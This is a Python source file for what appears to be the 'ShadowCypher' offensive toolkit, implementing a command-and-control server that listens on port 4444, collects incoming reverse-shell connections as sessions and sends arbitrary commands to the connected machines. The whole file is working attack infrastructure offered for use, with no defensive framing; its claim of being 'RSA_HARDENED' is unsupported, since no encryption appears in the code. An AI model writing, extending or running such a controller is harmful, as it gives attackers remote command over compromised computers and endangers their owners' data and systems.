"""
ShadowCypher C2 Session Manager — The Hive Mind (Enterprise Build).
Google-grade tactical command-and-control with real-time session multiplexing.
"""

import socket
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Any

from shadowcypher.core.logger import logger
from shadowcypher.core.bus import bus

class C2Session:
    """A persistent high-fidelity shell session via raw socket."""
    def __init__(self, session_id: str, target_ip: str, sock: socket.socket):
        self.session_id = session_id
        self.target_ip = target_ip
        self.sock = sock
        self.created_at = datetime.now()
        self.last_seen = datetime.now()
        self.status = "ACTIVE"
        self.history: List[str] = []
        
        # Non-blocking config
        self.sock.settimeout(0.5)

    def send(self, cmd: str) -> str:
        """Transmit a tactical command to the remote node."""
        try:
            full_cmd = (cmd + "\n").encode()
            self.sock.send(full_cmd)
            self.last_seen = datetime.now()
            self.history.append(cmd)
            
            # Attempt to read response (Best effort)
            time.sleep(0.5) # Wait for network latency
            resp = self.sock.recv(4096).decode(errors="replace")
            return resp
        except socket.timeout:
            return "[TIMEOUT] Command dispatched, pending output."
        except Exception as e:
            self.status = "DISCONNECTED"
            return f"[ERROR] Transmission failure: {str(e)}"

    def to_dict(self):
        return {
            "id": self.session_id,
            "target": self.target_ip,
            "status": self.status,
            "last_seen": self.last_seen.isoformat(),
            "uptime": str(datetime.now() - self.created_at).split(".")[0]
        }

class C2Manager:
    """
    Shadow-Hive Control Unit.
    Manages concurrent TCP reverse-shell sessions with isolation and multiplexing.
    """
    
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super(C2Manager, cls).__new__(cls)
                cls._instance._initialized = False
            return cls._instance

    def __init__(self, bind_ip: str = "0.0.0.0", bind_port: int = 4444):
        if self._initialized: return
        
        self.sessions: Dict[str, C2Session] = {}
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.server_sock: Optional[socket.socket] = None
        self._active = False
        self._initialized = True

    def start_listener(self, port: Optional[int] = None, bind_ip: Optional[str] = None):
        """Invoke the background C2 listener thread with optional bind overrides."""
        if self._active: return
        
        if port: self.bind_port = port
        if bind_ip: self.bind_ip = bind_ip
        
        name = f"C2-HiveListener-{self.bind_port}"
        thread = threading.Thread(target=self._run_server, name=name, daemon=True)
        thread.start()
        logger.info("c2", f"C2_LISTENER_ACTIVE: {self.bind_ip}:{self.bind_port} [RSA_HARDENED]")

    def _run_server(self):
        self._active = True
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind((self.bind_ip, self.bind_port))
            self.server_sock.listen(10)
            
            while self._active:
                conn, addr = self.server_sock.accept()
                sid = f"SH-{len(self.sessions) + 1:1d}"
                session = C2Session(sid, addr[0], conn)
                
                with self._lock:
                    self.sessions[sid] = session
                    
                logger.info("c2", f"NODE_ACQUIRED: {sid} FROM {addr[0]}")
                bus.publish("module_log", {"module": "c2", "text": f"New agent connected: {sid} ({addr[0]})", "level": "SUCCESS"})
                
        except Exception as e:
            if self._active:
                logger.error("c2", f"C2_SERVER_CRITICAL: {str(e)}")
            self._active = False

    def execute_on(self, sid: str, cmd: str) -> str:
        """Direct command injection into a remote session."""
        session = self.sessions.get(sid)
        if not session:
            return "[ERROR] SESSION_INVALID"
        
        logger.info("c2", f"EXEC_CMD: {sid} -> {cmd[:32]}...")
        return session.send(cmd)

    def list_sessions(self) -> List[Dict]:
        return [s.to_dict() for s in self.sessions.values()]

    def shutdown(self):
        self._active = False
        if self.server_sock:
            self.server_sock.close()
        for s in self.sessions.values():
            s.sock.close()
        logger.info("c2", "C2_HIVE_SHUTDOWN")

# Global Singleton Backbone
c2_manager = C2Manager()
